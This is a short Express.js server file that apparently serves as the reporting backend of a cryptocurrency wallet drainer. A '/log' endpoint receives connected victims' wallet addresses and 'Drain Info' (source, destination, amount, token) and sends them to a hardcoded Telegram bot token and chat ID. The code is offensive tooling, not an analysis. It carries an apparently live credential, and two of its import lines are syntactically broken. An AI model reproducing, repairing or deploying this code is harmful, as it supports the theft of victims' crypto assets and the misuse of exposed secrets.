
import express from 'express';
import axios = from 'axios';
import cors = from 'cors';

const app = express();
app.use(express.json());
app.use(cors());  // Allow requests from any frontend

// 🔐 Replace these with your real bot token and chat ID
const BOT_TOKEN = "7628605165:AAE00DAUg2Mp-U9Z1PGxKlqDOmyULM4m_nM"; //"YOUR_TELEGRAM_BOT_TOKEN";
const CHAT_ID = "6426216957"; //"YOUR_TELEGRAM_CHAT_ID";

app.post("/log", async (req, res) => {
    const { wallet, chainId, drainInfo } = req.body;

    let text = `💼 Wallet Connected:\nAddress: ${wallet}\nChain ID: ${chainId}`;

    if (drainInfo) {
        text += `\n\n✅ Drain Info:\nFrom: ${drainInfo.from}\nTo: ${drainInfo.to}\nAmount: ${drainInfo.amount} ${drainInfo.token || 'ETH/BNB'}`;
    }

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text,
        });
        res.status(200).send("Logged to Telegram");
    } catch (err) {
        console.error("Telegram error:", err);
        res.status(500).send("Telegram failed");
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Telegram logger running on port ${PORT}`));
